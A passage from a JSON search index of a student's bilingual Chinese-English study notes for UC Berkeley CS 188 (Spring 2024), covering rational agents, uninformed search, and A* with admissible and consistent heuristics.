\u5373\u53ef\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/#_7","title":"\u9605\u8bfb","text":"<p>\u4ece\u5934\u5f00\u59cb\u83b7\u53d6\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u9605\u8bfb\u4f53\u9a8c\u53ef\u4ee5\u770b\u8fd9\u91cc\uff1b\u8981\u6c42\u4e0d\u9ad8\u7684\u8bdd\u7b80\u5355\u7248\u5982\u4e0b\uff1a</p> <ol> <li>\u83b7\u53d6 obsidian\uff1b</li> <li>\u5bfc\u5165 markdown\uff1b</li> <li>\u70b9\u51fb\u53f3\u4e0a\u89d2\u8fdb\u5165\u9605\u8bfb\u89c6\u56fe\u5373\u53ef\u3002</li> </ol> <p></p> <ol> <li> <p>\u5176\u4e00\uff0c\u6211\u4e0d\u80fd\u786e\u4fdd\u6211\u7684\u7ffb\u8bd1\u6b63\u786e\u6027\uff1b\u5176\u4e8c\uff0c\u7f51\u9875/obsidian \u9605\u8bfb\u5df2\u7ecf\u80fd\u591f\u501f\u52a9\u5f88\u591a\u63d2\u4ef6\u8f85\u7ec4\u9605\u8bfb\uff0c\u53ef\u53c2\u8003\u8bfb / \u5199\u6587\u7ae0\uff1b\u5176\u4e09\uff0c\u672c\u4eba\u7cbe\u529b\u6709\u9650\uff0c\u6055\u4e0d\u80fd\u5b8c\u5168\u6253\u9020\u4e00\u4e2a CS188 \u5168\u4e2d\u6587\u9605\u8bfb\u73af\u5883\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/","title":"cs188 - sp24","text":"<p>\u4e2d\u6587 | English</p>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#introduction","title":"Introduction","text":"<p>This repository contains notes &amp; self-study materials for UCB CS 188 Spring 2024; theoretically, all the materials you need to study this course can be found here and in the given external links.</p> <ul> <li>Notes: The main body is the original course notes<sup>1</sup>, with my own thoughts and typesetting added. You can read these notes on my blog. However, for a better viewing experience, it is recommended to use Obsidian, see Usage-Reading.</li> <li>Self-study materials: Since some courses at UCB in recent years have started requiring CalNet Authentication Service, to facilitate future learning, I have archived the materials I believe are necessary for self-study in this repository. As I am unsure how to apply for reprint permission, if this project has a negative impact on the original course and its related projects, please contact me to delete it.</li> <li>If you are familiar with search algorithms, have a good understanding of ML/DL/RL knowledge, and want to explore some small project files, you can directly work on the projects.</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#table-of-contents","title":"Table of Contents","text":"","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#noteproject","title":"note&amp;project","text":"<ul> <li>Intro<ul> <li>01-Intro_to_AI_Rational_Agents</li> <li>project-0</li> </ul> </li> <li>Search<ul> <li>02-State_Spaces_Uninformed_Search</li> <li>03-Informed_Search_Astar_and_Heuristics</li> <li>04-Local_Search</li> <li>project-1</li> </ul> </li> <li>Multi-Agent Search<ul> <li>05-Trees_Minimax_Pruning</li> <li>06-Expectimax_Monte_Carlo_Tree_Search</li> <li>project-2</li> </ul> </li> <li>Logic and Classical Planning<ul> <li>07-Propositional_Logic_and_Planning</li> <li>08-DPLL&amp;ForwardChaining</li> <li>09-First_Order_Logic</li> <li>project-3</li> </ul> </li> <li>Ghostbusters<ul> <li>10-Intro_to_Probability</li> <li>11-Bayesian_Network_Intro</li> <li>12-Variable_Elimination</li> <li>13-Approximate_Inference</li> <li>14-Markov_Models</li> <li>15-Hidden_Marko_Models</li> <li>16-PF-DN-VPI</li> <li>17-Markov_Decision_Processes</li> <li>project-4</li> </ul> </li> <li>Machine/Reinforcement Learning<ul> <li>18-Iteration</li> <li>19-Navie_Bayes</li> <li>20-Perceptron</li> <li>21-Regression</li> <li>22-Neural_Networks</li> <li>24-Reinforcement_Learnin</li> <li>project5/6 No explanation<ul> <li>project 6 - Q7 code has been completed, but the training results are very poor, and there is nowhere to debug it, so I gave up.</li> </ul> </li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#materials","title":"materials","text":"<ul> <li>course_page<ul> <li>Calendar of the course website, convenient for viewing how to self-study;</li> </ul> </li> <li>disc<ul> <li>Relevant discussion questions and their solutions;</li> </ul> </li> <li>origianl_note<ul> <li>Original course notes, theoretically viewing the above personal notes is sufficient;</li> </ul> </li> <li>project<ul> <li>original_zip<ul> <li>Original project source code;</li> </ul> </li> <li>intro_page<ul> <li>Saved page files of the lab documentation.</li> </ul> </li> <li>solution<ul> <li>Reference code (moved to <code>cs188/project/solution/</code>)</li> </ul> </li> </ul> </li> <li>gradecode<ul> <li>4VK322.</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#usage","title":"Usage","text":"","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#download","title":"Download","text":"","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#using-git","title":"Using git","text":"<pre><code>git clone https://github.com/Darstib/cs188.git\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#directly-download-all","title":"Directly Download All","text":"","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#partial-download","title":"Partial Download","text":"<p>If you only want the note or project part or another single folder, you can use DownGit, enter the URL of the target folder in this git repository.</p>","tags":["notes","cs188"]},{"location":"note/cs188/README_en/#reading","title":"Reading","text":"<p>For a better reading experience from scratch, you can refer to here; for a simpler approach, see below:</p> <ol> <li>Get Obsidian;</li> <li>Import Markdown;</li> <li>Click the top-right corner to enter reading view.</li> </ol> <p></p> <ol> <li> <p>Firstly, I cannot guarantee the correctness of my translation; secondly, webpage/Obsidian reading can already be assisted by many plugins, you can refer to Reading/Writing Articles; thirdly, my personal energy is limited, and I regret that I cannot fully create a CS188 full Chinese reading environment.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/","title":"cs188 - sp24 note","text":"<p>\u8fd9\u91cc\u7684\u662f UCB CS 188 Spring 2024 \u7684\u7b14\u8bb0\uff0c\u4e3b\u4f53\u4e3a\u539f\u8bfe\u7a0b notes\uff0c\u52a0\u5165\u4e86\u81ea\u5df1\u7684\u601d\u8003\u548c\u6392\u7248\u3002</p> <p>\u8be5\u8bfe\u7a0b\u6240\u6709\u8d44\u6599\u5b58\u653e\u4e8e cs188 repo\uff0c\u7b14\u8bb0\u4e2d\u90e8\u5206\u94fe\u63a5\u4e5f\u6307\u5411\u4e3a\u4ed3\u5e93\u4e2d\u7684\u76f8\u5bf9\u8def\u5f84\uff1b\u6240\u4ee5\u5efa\u8bae\u5c06\u4ed3\u5e93\u8d44\u6599\u5168\u6570\u83b7\u53d6\uff0c\u5e76\u4f7f\u7528 obsidian \u6253\u5f00\u3002</p> <p>Attention</p> <p>\u4ee5\u4e0b\u6240\u6709\u8bb2\u89e3\u9ed8\u8ba4\u8bfb\u8005\u9605\u8bfb\u6216\u7406\u89e3\u4e86\u5176\u4e2d PREREQUISITE \u90e8\u5206\u6240\u6709\u5185\u5bb9\uff1bpython \u7684\u4f7f\u7528\u9ed8\u8ba4\u4f1a\uff1b\u81f3\u5c11\u9700\u8981\u660e\u767d\u7c7b\u7684\u4f7f\u7528\u3002</p> <ul> <li>01-Intro_to_AI_Rational_Agents</li> <li>02-State_Spaces_Uninformed_Search</li> <li>03-Informed_Search_Astar_and_Heuristics</li> <li>04-Local_Search</li> <li>05-Trees_Minimax_Pruning</li> <li>06-Expectimax_Monte_Carlo_Tree_Search</li> <li>07-Propositional_Logic_and_Planning</li> <li>08-DPLL&amp;ForwardChaining</li> <li>09-First_Order_Logic</li> <li>10-Intro_to_Probability</li> <li>11-Bayesian_Network_Intro</li> <li>12-Variable_Elimination</li> <li>13-Approximate_Inference</li> <li>14-Markov_Models</li> <li>15-Hidden_Marko_Models</li> <li>16-PF-DN-VPI</li> <li>17-Markov_Decision_Processes</li> <li>18-Iteration</li> <li>19-Navie_Bayes</li> <li>20-Perceptron</li> <li>21-Regression</li> <li>22-Neural_Networks</li> <li>24-Reinforcement_Learnin</li> </ul>","tags":["notes"]},{"location":"note/cs188/note/01-Intro_to_AI_Rational_Agents/","title":"01 Intro to AI Rational Agents","text":"<p>Prerequisite</p> <ul> <li>\u6709\u9650\u72b6\u6001\u673a</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/01-Intro_to_AI_Rational_Agents/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/01-Intro_to_AI_Rational_Agents/#agents","title":"Agents","text":"<ul> <li>rational agent<ul> <li>an entity that has goals or preferences and tries to perform a series of actions that yield the best/optimal expected outcome given these goals.</li> </ul> </li> <li>reflex agent<ul> <li>one that doesn\u2019t think about the consequences of its actions, but rather selects an action based solely on the current state of the world.</li> </ul> </li> <li>PEAS (Performance Measure, Environment, Actuators, Sensors)</li> </ul> <p>The design of an agent heavily depends on the type of environment the agents acts upon . We can characterize the types of environments in the following ways:</p> <ul> <li>In partially observable environments\uff08\u90e8\u5206\u53ef\u89c2\u6d4b\u73af\u5883\uff09, the agent does not have full information about the state and thus the agent must have an internal estimate of the state of the world. This is in contrast to fully observable environments, where the agent has full information about their state.</li> <li>Stochastic environments\uff08\u968f\u673a\u73af\u5883\uff09 have uncertainty in the transition model, i.e. taking an action in a specific state may have multiple possible outcomes with different probabilities. This is in contrast to deterministic environments\uff08\u786e\u5b9a\u73af\u5883\uff09, where taking an action in a state has a single outcome that is guaranteed to happen.</li> <li>In multi-agent environments\uff08\u591a\u667a\u80fd\u4f53\u73af\u5883\uff09 the agent acts in the environments along with other agents. For this reason the agent might need to randomize its actions in order to avoid being \u201cpredictable\" by other agents.</li> <li>If the environment does not change as the agent acts on it, then this environment is called static. This is contrast to dynamic environments that change as the agent interacts with it.</li> <li>If an environment has known physics, then the transition model (even if stochastic) is known to the agent and it can use that when planning a path. If the physics are unknown the agent will need to take actions deliberately to learn the unknown dynamics.</li> </ul> <p>Help</p> <p>\u5728\u8fd9\u91cc\uff0c<code>know physics</code> \u5e94\u8be5\u662f\u6307\u5df2\u7ecf\u88ab\u4eba\u7c7b\u63a2\u7d22\u51fa\u6765\u7684\u89c4\u5f8b\uff1b\u800c <code>unknown physics</code> \u5219\u662f\u6307\u5c1a\u4e14\u6ca1\u6709\u5f97\u77e5\u7684\u89c4\u5f8b\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/01-Intro_to_AI_Rational_Agents/#link","title":"link","text":"<ul> <li>cs188-sp24-note01</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/","title":"02 State Spaces Uninformed Search","text":"Summary <p>\u65e0\u5e8f\u641c\u7d22\u7b97\u6cd5\u5728\u72b6\u6001\u7a7a\u95f4\u4e2d\u63a2\u7d22\u89e3\u51b3\u65b9\u6848\uff0c\u800c\u4e0d\u8003\u8651\u542f\u53d1\u5f0f\u4fe1\u606f\u3002</p> <ul> <li>\u72b6\u6001\u7a7a\u95f4\uff1a\u6240\u6709\u53ef\u80fd\u72b6\u6001\u7684\u96c6\u5408\u3002</li> <li>\u641c\u7d22\u6811\uff1a\u4ece\u521d\u59cb\u72b6\u6001\u5f00\u59cb\uff0c\u901a\u8fc7\u64cd\u4f5c\u751f\u6210\u7684\u72b6\u6001\u56fe\u3002</li> <li>\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08BFS\uff09\uff1a\u6309\u5c42\u7ea7\u63a2\u7d22\u72b6\u6001\uff0c\u786e\u4fdd\u627e\u5230\u6700\u77ed\u8def\u5f84\u3002</li> <li>\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08DFS\uff09\uff1a\u6cbf\u7740\u4e00\u6761\u8def\u5f84\u6df1\u5165\u63a2\u7d22\uff0c\u53ef\u80fd\u9519\u8fc7\u66f4\u4f18\u89e3\u3002</li> <li>\u7edf\u4e00\u4ee3\u4ef7\u641c\u7d22\uff08UCS\uff09\uff1a\u6839\u636e\u8def\u5f84\u6210\u672c\u63a2\u7d22\u72b6\u6001\uff0c\u4fdd\u8bc1\u627e\u5230\u6700\u4f4e\u6210\u672c\u8def\u5f84\u3002</li> </ul> <p>Prerequisite</p> <ul> <li>dfs</li> <li>bfs</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#state-spaces-and-search-problems","title":"State Spaces and Search Problems","text":"<p>In order to create a rational planning agent, we need a way to mathematically express the given environment in which the agent will exist . To do this, we must formally express a search problem - given our agent\u2019s current state (its configuration within its environment),</p> <p>A search problem consists of the following elements: </p> <ul> <li>A state space - The set of all possible states that are possible in your given world </li> <li>A set of actions available in each state </li> <li>A transition model - Outputs the next state when a specific action is taken at current state </li> <li>An action cost - Incurred when moving from one state to another after applying an action </li> <li>A start state - The state in which an agent exists initially </li> <li>A goal test - A function that takes a state as input, and determines whether it is a goal state</li> </ul> <p>a path from the start state to the goal state (typically called a plan)</p> <p>start state -&gt; state space (using the action and transition and cost methods) -&gt; goal state</p> <p>the difference between a world state, and a search state.</p> <p>A world state contains all information about a given state, whereas a search state contains only the information about the world that\u2019s necessary for planning (primarily for space effiency reasons).To illustrate these concepts, we\u2019ll introduce the hallmark motivating example of this course - Pacman. </p> <p>The game of Pacman is simple: Pacman must navigate a maze and eat all the (small) food pellets in the maze without being eaten by the malicious patrolling ghosts. If Pacman eats one of the (large) power pellets, he becomes ghost-immune for a set period of time and gains the ability to eat ghosts for points.</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#state-space-size","title":"State Space Size","text":"<p>An important question that often comes up while estimating the computational runtime of solving a search problem is the size of the state space. This is done almost exclusively with the fundamental counting principle, which states that if there are n variable objects in a given world which can take on x1, x2, ..., xn different values respectively, then the total number of states is x1 \u00b7 x2 \u00b7 ... \u00b7 xn.</p> <p>fundamental counting principle</p> <p>The fundamental counting principle is a way to determine the total number of possible outcomes in a situation. If you have multiple choices to make, and each choice has a certain number of options, you multiply the number of options for each choice together.</p> <p>For example, in the Pacman scenario:</p> <ul> <li>Pacman has 120 possible positions.</li> <li>Pacman can face 4 directions.</li> <li>There are 2 ghosts, each with 12 possible positions.</li> <li>There are 30 food pellets, each can be either eaten or not (2 options).</li> </ul> <p>So, the total number of possible states is calculated by multiplying these numbers together: \\(120 \\times 4 \\times 12 \\times 12 \\times 2^{30}\\)</p> <p>This gives you the total number of different states Pacman can be in.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#state-space-graphs-and-search-trees","title":"State Space Graphs and Search Trees","text":"<p>The final piece of the puzzle is that of state space graphs and search trees.A state space graph<sup>1</sup> is constructed with states representing nodes, with directed edges existing from a state to its children.</p> <p>It\u2019s important to note that in a state space graph, each state is represented exactly once  - there\u2019s simply no need to represent a state multiple times, and knowing this helps quite a bit when trying to reason about search problems.</p> <p>Though search trees are also a class of graph with states as nodes and actions as edges between states, each state/node encodes not just the state itself, but the entire path (or plan) from the start state to the given state in the state space graph. </p> <p></p> <p>Since there often exist multiple ways to get from one state to another, states tend to show up multiple times in search trees. As a result, search trees are greater than or equal to their corresponding state space graph in size.</p> <p>We\u2019ve already determined that state space graphs themselves can be enormous in size even for simple problems, and so the question arises - how can we perform useful computation on these structures if they\u2019re too big to represent in memory? The answer lies in how we compute the children of a current state - we only store states we\u2019re immediately working with, and compute new ones on-demand using the corresponding getNextState, getAction, and getActionCost methods. </p>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#uninformed-search","title":"Uninformed Search","text":"<p>The standard protocol for finding a plan to get from the start state to a goal state is to maintain an outer frontier of partial plans derived from the search tree . We continually expand our frontier by removing a node (which is selected using our given strategy) corresponding to a partial plan from the frontier, and replacing it on the frontier with all its children. Removing and replacing an element on the frontier with its children corresponds to discarding a single length n plan and bringing all length (n+1) plans that stem from it into consideration. We continue this until eventually removing a goal state off the frontier, at which point we conclude the partial plan corresponding to the removed goal state is in fact a path to get from the start state to the goal state.</p> <p>Practically, most implementations of such algorithms will encode information about the parent node, distance to node, and the state inside the node object. This procedure we have just outlined is known as tree search, and the pseudocode for it is presented below:</p> pseudocode for tree search<pre><code>function TREE-SEARCH(problem, frontier) return a solution or failure\n    frontier \u2190 INSERT(MAKE-NODE(INITIAL-STATE[problem]), frontier)\n    while not IS-EMPTY(frontier) do\n        node \u2190 POP(frontier)\n        if problem.IS-GOAL(node.STATE) then\n            return node\n        end\n        for each child-node in EXPAND(problem, node) do\n            add child-node to frontier\n        end\n    end\n    return failure\n\nfunction EXPAND(problem, node) yields nodes\n    s\u2190 node.STATE\n    for each action in problem.ACTIONS(s) do\n        s\u2032 \u2190 problem.RESULT(s, action)\n    end\n    yield NODE(STATE=s\u2032, PARENT=node, ACTION=action)\n</code></pre> <p>Attention</p> <p>\u539f\u7b14\u8bb0\u4e2d\u7684 pseudocode \u957f\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50\uff1a</p> <p></p> <p>\u5b9e\u8bdd\u8bf4\u770b\u7740\u5f88\u4e0d\u4e60\u60ef\uff0c\u6240\u4ee5\u6211\u4f1a\u5c06\u5176\u4ee5\u7c7b python \u7684\u683c\u5f0f\u5199\u4e0b\u6765</p> <p>\u5f88\u719f\u6089\uff1f\u786e\u5b9e\uff0c\u5f80\u4e0b\u770b\u3002</p> <p>We\u2019ll now cover three such strategies in succession: depth-first search, breadth-first search, and uniform cost search. Along with each strategy, some rudimentary properties of the strategy are presented as well, in terms of the following:</p> <ul> <li>The completeness of each search strategy - if there exists a solution to the search problem, is the strategy guaranteed to find it given infinite computational resources? </li> <li>The optimality of each search strategy - is the strategy guaranteed to find the lowest cost path to a goal state? </li> <li>The branching factor b - The increase in the number of nodes on the frontier each time a frontier node is dequeued and replaced with its children is O(b). At depth k in the search tree, there exists O(b k ) nodes. </li> <li>The maximum depth m. </li> <li>The depth of the shallowest solution s.</li> </ul> <p>Depth-First Search &amp; Breadth-First Search \u6bd4\u8f83\u5e38\u89c1\uff0c\u8fd9\u91cc\u7565\u8fc7\u3002</p> <p></p> <p>Info</p> <p>After we mainly around the several aspects to discuss a search algorithm.</p> <ul> <li>Description</li> <li>FrontierRepresentation</li> <li>Completeness </li> <li>Optimality</li> <li>Time Complexity</li> <li>Space Complexity </li> </ul> <p>In this note, I'll show them in detail; but I'll just give a brief conclusion in later notes.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#uniform-cost-search","title":"Uniform Cost Search","text":"<ul> <li>Description - Uniform cost search (UCS), our last strategy, is a strategy for exploration that always selects the lowest cost frontier node from the start node for expansion. </li> <li>Frontier Representation - To represent the frontier for UCS, the choice is usually a heap-based priority queue, where the priority for a given enqueued node v is the path cost from the start node to v, or the backward cost of v. Intuitively, a priority queue constructed in this manner simply reshuffles itself to maintain the desired ordering by path cost as we remove the current minimum cost path and replace it with its children.</li> <li>Completeness - Uniform cost search is complete. If a goal state exists, it must have some finite length shortest path; hence, UCS must eventually find this shortest length path. </li> <li>Optimality - UCS is also optimal if we assume all edge costs are nonnegative. By construction, since we explore nodes in order of increasing path cost, we\u2019re guaranteed to find the lowest-cost path to a goal state. The strategy employed in Uniform Cost Search is identical to that of Dijkstra\u2019s algorithm, and the chief difference is that UCS terminates upon finding a solution state instead of finding the shortest path to all states. Note that having negative edge costs in our graph can make nodes on a path have decreasing length, ruining our guarantee of optimality. (See Bellman-Ford algorithm for a slower algorithm that handles this possibility) </li> <li>Time Complexity - Let us define the optimal path cost as \\(C^\u2217\\) and the minimal cost between two nodes in the state space graph as \u03b5. Then, we must roughly explore all nodes at depths ranging from 1 to \\(C^\u2217/\u03b5\\), leading to an runtime of O(\\(b^{C^\u2217/\u03b5}\\) ).</li> <li>Space Complexity - Roughly, the frontier will contain all nodes at the level of the cheapest solution, so the space complexity of UCS is estimated as O(\\(b^{C^\u2217/\u03b5}\\) ).</li> </ul> <p>Tip</p> <p>\u8fd9\u4e09\u79cd\u641c\u7d22\u7b56\u7565\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u4ed6\u4eec\u6269\u5c55\uff08\u4f7f\u5f97 path \u53d8\u957f\uff09\u7b56\u7565\u7684\u4e0d\u540c\uff0c\u800c\u4f53\u73b0\u5728\u7f16\u7a0b\u4e0a\u5c31\u662f\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\u4e0d\u540c\uff1a</p> <ul> <li>DFS -&gt; stack</li> <li>BFS -&gt; queue</li> <li>UCS -&gt; (min) heap</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/02-State_Spaces_Uninformed_Search/#link","title":"link","text":"<ul> <li>cs188-sp24-note02</li> </ul> <ol> <li> <p>\u611f\u89c9\u5c31\u662f\u6709\u9650\u72b6\u6001\u673a (FSM, Finite state machine)\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/","title":"03 Informed Search Astar and Heuristics","text":"<p>Prerequisite</p> <ul> <li>\u8303\u6570</li> <li>\u5e8f\u5173\u7cfb</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#informed-search","title":"Informed Search","text":"<p>Uniform cost search is good because it\u2019s both complete and optimal, but it can be fairly slow because it expands in every direction from the start state while searching for a goal. If we have some notion of the direction in which we should focus our search , we can significantly improve performance and \"hone in\" on a goal much more quickly. This is exactly the focus of informed search.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#heuristics","title":"Heuristics\uff08\u542f\u53d1\u5f0f\uff09","text":"<p>Heuristics are the driving force that allow estimation of distance to goal states - they\u2019re functions that take in a state as input and output a corresponding estimate.</p> <p>The computation performed by such a function is specific to the search problem being solved. For reasons that we\u2019ll see in A* search, below.</p> <p>we usually want heuristic functions to be a lower bound on this remaining distance to the goal , and so heuristics are typically solutions to relaxed problems (where some of the constraints of the original problem have been removed).</p> <p>Turning to our Pacman example, let\u2019s consider the pathing problem described earlier. A common heuristic that\u2019s used to solve this problem is the Manhattan distance, which for two points (x1, y1) and (x2, y2) is defined as: Manhattan(x1, y1, x2, y2) = |x1 \u2212x2|+|y1 \u2212y2|</p> <p></p> <p>Help</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5148\u5c06\u6761\u4ef6\u653e\u5bbd\u677e\uff08\u5728\u4e0a\u56fe\u4e2d\u5c31\u662f\u5148\u65e0\u89c6\u5899\u4f53\uff09\u6765\u201c\u8bd5\u63a2\u201d\u7740\u89e3\u51b3 relaxed problem\uff0c\u5f97\u5230\u5f85\u89e3\u51b3\u95ee\u9898\u7684\u4e0b\u754c\u3002</p> <p>This concept of preference is very powerful, and is utilized by the following two search algorithms that implement heuristic functions: greedy search and A*.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#greedy-search","title":"Greedy Search","text":"<ul> <li>Description - Greedy search is a strategy for exploration that always selects the frontier node with the lowest heuristic value for expansion , which corresponds to the state it believes is nearest to a goal.</li> <li>Frontier Representation - Greedy search operates identically to UCS, with a priority queue , while using estimated forward cost in the form of heuristic values.</li> <li>Completeness and Optimality - Greedy search is not guaranteed to find a goal state if one exists, nor is it optimal, particularly in cases where a very bad heuristic function is selected.</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#a-search","title":"A* Search","text":"<ul> <li>Description - A* search is a strategy for exploration that always selects the frontier node with the lowest estimated total cost for expansion , where total cost is the entire cost from the start node to the goal node.</li> <li>Frontier Representation - Just like greedy search and UCS, A search also uses a priority queue to represent its frontier. However, A Search uses estimated total cost (= total backward cost + estimated forward cost)</li> <li>Completeness and Optimality - A* search is both complete and optimal, given an appropriate heuristic  (which we\u2019ll cover in a minute).</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#admissibility-and-consistency","title":"Admissibility and Consistency","text":"<p>Now, let\u2019s spend some time discussing what constitutes a good heuristic. </p> <p>Question</p> <p>Why?</p> <p>Let\u2019s first reformulate the methods used for determining priority queue ordering in UCS, greedy search, and A* with the following definitions:</p> <ul> <li>g(n) - The function representing total backwards cost computed by UCS.</li> <li>h(n) - The heuristic value function, or estimated forward cost, used by greedy search.</li> <li>f(n) - The function representing estimated total cost, used by A* search. f(n) = g(n) +h(n).</li> </ul> <p>Indeed, it\u2019s very easy to find heuristics that break these two coveted properties. As an example, consider the heuristic function h(n) = 1\u2212g(n). Such a heuristic reduces A* search to BFS.</p> <p>[!DEFINITION ]</p> <p>The condition required for optimality when using A tree search is known as admissibility*. The admissibility constraint states that the value estimated by an admissible heuristic is neither negative nor an overestimate, that is: \\(\u2200n, 0 \u2264 h(n) \u2264 h^\u2217 (n)\\), (\\(h^\u2217(n)\\) is the true optimal forward cost to reach a goal state from a given node n).</p> <p>Theorem</p> <p>For a given search problem, if the admissibility constraint is satisfied by a heuristic function h, using A* tree search with h on that search problem will yield an optimal solution.</p> <p></p> <p>And in case of revisiting the same node multiple times, the natural solution is to simply keep track of which states you\u2019ve already expanded, and never expand them again. Tree search with this added optimization is known as graph search, and the pseudocode for it is presented below:</p> pseudocode for graph search<pre><code>function GRAPH-SEARCH(problem, frontier) return a solution or failure\n    reached \u2190 an empty set\n    frontier \u2190 INSERT(MAKE-NODE(INITIAL-STATE[problem]), frontier)\n    while not IS-EMPTY(frontier) do\n        node \u2190 POP(frontier)\n        if problem.IS-GOAL(node.STATE) then\n            return node\n        end\n        if node.STATE is not in reached then\n            add node.STATE in reached\n            for each child-node in EXPAND(problem, node) do\n                frontier \u2190 INSERT(child-node, frontier)\n            end\n        end\n    end\n    return failure\n</code></pre> <p>Bad example</p> <p>However, just consider the following simple state space graph and corresponding search tree, annotated with weights and heuristic values:</p> <p></p> <p>In the above example, it\u2019s clear that the optimal route is to follow S \u2192 A \u2192C \u2192 G, yielding a total path cost of 1+1+3 = 5. The only other path to the goal, S \u2192 B \u2192C \u2192 G has a path cost of 1+2+3 = 6. However, because the heuristic value of node A is so much larger than the heuristic value of node B, node C is first expanded along the second, suboptimal path as a child of node B. It\u2019s then placed into the \"reached\" set, and so A graph search fails to reexpand it when it visits it as a child of A, so it never finds the optimal solution. Hence, to maintain optimality under A graph search, we need an even stronger property than admissibility.  <p>[!DEFINITION ]</p> <p>consistency. The central idea of consistency is that we enforce not only that a heuristic underestimates the total distance to a goal from any given node, but also the cost/weight of each edge in the graph. The cost of an edge as measured by the heuristic function is simply the difference in heuristic values for two connected nodes. Mathematically, the consistency constraint can be expressed as follows: \\(\u2200A,C\\quad h(A)\u2212h(C) \u2264 cost(A,C)\\)</p> <p>Theorem</p> <p>For a given search problem, if the consistency constraint is satisfied by a heuristic function h, using A* graph search with h on that search problem will yield an optimal solution.</p> <p></p> <p>A couple of important highlights from the discussion above before we proceed: for heuristics that are either admissible/consistent to be valid, it must by definition be the case that h(G) = 0 for any goal state G.</p> <p>Additionally, Additionally, consistency is not just a stronger constraint than admissibility, consistency implies admissibility. This stems simply from the fact that if no edge costs are overestimates (as guaranteed by consistency), the total estimated cost from any node to a goal will also fail to be an overestimate. This stems simply from the fact that if no edge costs are overestimates (as guaranteed by consistency), the total estimated cost from any node to a goal will also fail to be an overestimate.</p> <p>Help</p> <p>\u7b80\u5355\u6765\u8bf4\uff0cadmissible \u8981\u6c42 heuristic function \u5373 h(n) \u4f4e\u4f30\u5230\u8fbe\u76ee\u6807\u7684 cost\uff0c\u800c consitency \u8981\u6c42 h(n) \u4f4e\u4f30\u4efb\u610f\u4e24\u4e2a state \u4e4b\u95f4\u7684 cost \u5dee\u3002\u5728 consitency \u4e2d \\(h(A)\u2212h(C) \u2264 cost(A,C)\\)\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4efb\u610f\u4e00\u6761 path\uff0c\u5c06\u6709 \\(h(A) - h(G)= \\sum (h(A)\u2212h(C)) \\leq \\sum cost(A, C) = h^*(A)\\)\uff0c\u800c h(G)=0\uff0c\u6545 admissible \u6761\u4ef6\u4e5f\u6ee1\u8db3\u4e86\u3002</p> <p>note3 \u7ed9\u51fa\u4e86\u4e00\u4e2a admissible but inconsitency \u7684 h(n)\uff0c\u5982\u679c\u6ca1\u770b\u61c2\u53ef\u89c1\u539f note3#p7</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/03-Informed_Search_Astar_and_Heuristics/#dominance","title":"Dominance\uff08\u4f18\u52bf\u5ea6\uff09","text":"<p>The standard metric for this(creating \"good\" heuristics, and how to tell if one heuristic is better than another) is that of dominance. If heuristic a is dominant over heuristic b, then the estimated goal distance for a is greater than the estimated goal distance for b for every node in the state space graph. Mathematically, \\(\u2200n : h_{a}(n) \u2265 h_{b}(n)\\) .</p> <p>Info</p> <p>Additionally, the trivial heuristic is defined as h(n) = 0, and using it reduces A search to UCS. All admissible heuristics dominate the trivial heuristic. The trivial heuristic is often incorporated at the base of a semi-lattice* for a search problem, a dominance hierarchy of which it is located at the bottom.</p> <p>Help</p> <p>\u5173\u952e\u662f\u7406\u89e3\u8fd9\u4e2a semi-lattice\uff0c\u7528\u5e8f\u5173\u7cfb\u6765\u7406\u89e3\u5c31\u5f88\u4e0d\u9519\uff0c\u4e0b\u9762\u7684\u4f8b\u5b50\u4e5f\u5f88\u597d\u5730\u5e2e\u52a9\u6211\u4eec\u7406\u89e3\u3002</p> <p>Below is an example of a semi-lattice that 